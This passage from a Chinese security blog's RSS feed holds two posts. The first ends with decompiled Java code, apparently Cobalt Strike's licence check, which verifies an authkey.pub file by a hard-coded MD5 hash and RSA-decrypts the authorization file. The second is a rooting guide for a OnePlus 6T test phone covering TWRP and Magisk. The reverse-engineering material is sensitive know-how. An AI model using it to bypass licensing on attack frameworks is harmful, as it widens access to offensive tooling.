style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var2) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not initialize crypto&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         MudgeSanity.&lt;span style=&#34;color:#a6e22e&#34;&gt;logException&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AuthCrypto init&amp;#34;&lt;/span&gt;, var2, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;readAll&lt;/span&gt;(CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClassLoader&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getResourceAsStream&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;resources/authkey.pub&amp;#34;&lt;/span&gt;));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;MD5&lt;/span&gt;(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8bb4df00c120881a1945a43e2bb2379e&amp;#34;&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;equals&lt;/span&gt;(CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;toHex&lt;/span&gt;(var2))) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;print_error&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid authorization file&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            System.&lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(0);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         X509EncodedKeySpec var3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; X509EncodedKeySpec(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         KeyFactory var4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; KeyFactory.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var4.&lt;span style=&#34;color:#a6e22e&#34;&gt;generatePublic&lt;/span&gt;(var3);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var5) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not deserialize authpub.key&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         MudgeSanity.&lt;span style=&#34;color:#a6e22e&#34;&gt;logException&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authpub.key deserialization&amp;#34;&lt;/span&gt;, var5, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var1) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var2.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var2;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            DataParser var3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; DataParser(var2);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;big&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; var4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;readInt&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var4 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;889274181) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pre-4.0 authorization file. Run update to get new file&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var4 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;889274157) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bad header&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; var5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;readShort&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;readBytes&lt;/span&gt;(var5);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var6;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var7) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var7.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMessage&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var1) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;synchronized&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;init&lt;/span&gt;(2, &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;doFinal&lt;/span&gt;(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var2;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var6) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var6.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMessage&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;authkey.pub在反编译出的resources目录下，可以通过ASN1editor去看看公钥&lt;/p&gt;</description>
    </item>
    <item>
      <title>一加测试机从环境配置到救砖全攻略</title>
      <link>http://localhost:1313/posts/%E4%B8%80%E5%8A%A0%E6%B5%8B%E8%AF%95%E6%9C%BA%E4%BB%8E%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%88%B0%E6%95%91%E7%A0%96%E5%85%A8%E6%94%BB%E7%95%A5/</link>
      <pubDate>Tue, 26 Apr 2022 06:14:00 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E4%B8%80%E5%8A%A0%E6%B5%8B%E8%AF%95%E6%9C%BA%E4%BB%8E%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%88%B0%E6%95%91%E7%A0%96%E5%85%A8%E6%94%BB%E7%95%A5/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要是公众号之前因为一些原因导致停更了，加上其他的原因很多东西其实都只沉积在个人笔记里了，刚好这两天入了个一加6T的测试机，配环境的时候也遇到了不少坑，但是在网上好像看文章别人配环境都是一马平川，就顺手把踩坑和解决的过程记录分享一下。&lt;/p&gt;&#xA;&lt;p&gt;首先装一下1+ USB Driver，官方论坛都能找到&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/39658ba5-f584-424a-b9d7-2a1df835d5f3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要是为了让电脑检测到设备，然后安装驱动，官方论坛也有&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/5db877cd-69cc-4810-a60f-a4a7cef6ca1d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一步就已经遇到坑了，如果电脑上有模拟器虚拟机啥的没关干净，存在僵尸进程的时候是无法安装成功的，建议重启后安装，否则就会卡在执行命令。&lt;/p&gt;&#xA;&lt;p&gt;如果这两个包找不到，建议直接去找一个一加万能工具包，正常的工具包测试不带毒，如果是第三方渠道下载的建议扫一扫，不排除被投毒的可能。因为我在下的时候就遇到一个疑似被投毒的工具包，后续如果有时间可能会出一篇分析文章。&lt;/p&gt;&#xA;&lt;p&gt;打开开发者选项，允许USB调试和OEM解锁，然后使用adb命令解锁BootLoader&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/29127671.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用音量键选择解锁后电源键确认，这步忘了拍照了。然后重启进入系统需要重新打开开发者模式并启用USB调试&lt;/p&gt;&#xA;&lt;p&gt;接下来使用高级重启引导加载器，也可以用adb reboot recovery命令进行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/67ae3422-0a0c-4b8b-b9fd-279763e63154.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在设备管理器里确定驱动情况&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/d0d3d009-e6fa-4a42-af25-585dd8a94c3b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;准备好TWRP的包，使用fastboot命令进入临时系统&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/20e28879-5124-49ee-a8ad-7e3d847a1840.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;中间好像出了什么奇怪的问题，直接裂开&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/474cf285-7849-42a1-ba54-400d5031c520.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;怀疑是驱动也出了什么问题，似乎是高通的驱动问题？&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4db22e0c-63a1-41ff-a5d1-147db143c90e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;于是网上下了个一加万能工具包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/ea3c3318-d1e4-42f4-b211-3f9467b52f4c.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;下完之后先把能装的驱动都装上，然后重刷一下系统，完成救砖之后降级了一下系统（原来是安卓11）降级到9或者10都可以，一加官方论坛是提供全量包的，可能由于系统版本原因导致无法刷入，降级之后重刷TWRP就成功了，可以改个语言，也可以不改&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/189d25e1-ed2f-45b7-a1a3-854dd367154d.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入高级-》Sideload-》滑块&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/16cc15a5-4298-494c-9dac-63a38b848014.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;将完整的twrp包刷入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4b8f1348-6e1b-4436-8cde-225382f73007.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后重新进入恢复模式，重新进行sideload，刷入magisk&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b1105f71-7e4f-4703-ba34-c5387500e5b7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/528ad50a-2b36-43a5-9b38-c2b4f7bea8d8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重启后magisk已安装，直接su即可切换到root&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/05594d79-4b71-47e9-977d-7c93fe3cce71.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;完成magisk安装后就已经root完了，现在就是一些基础的环境配置，建议装一下scrcpy这款神器，可以直接电脑操作，特别方便，截止发文的最新下载地址&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Genymobile/scrcpy/releases/tag/v1.23&#34;&gt;https://github.com/Genymobile/scrcpy/releases/tag/v1.23&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3d95b4f8-5e83-4e16-ab9f-1eca48040c9a.jpg&#34; 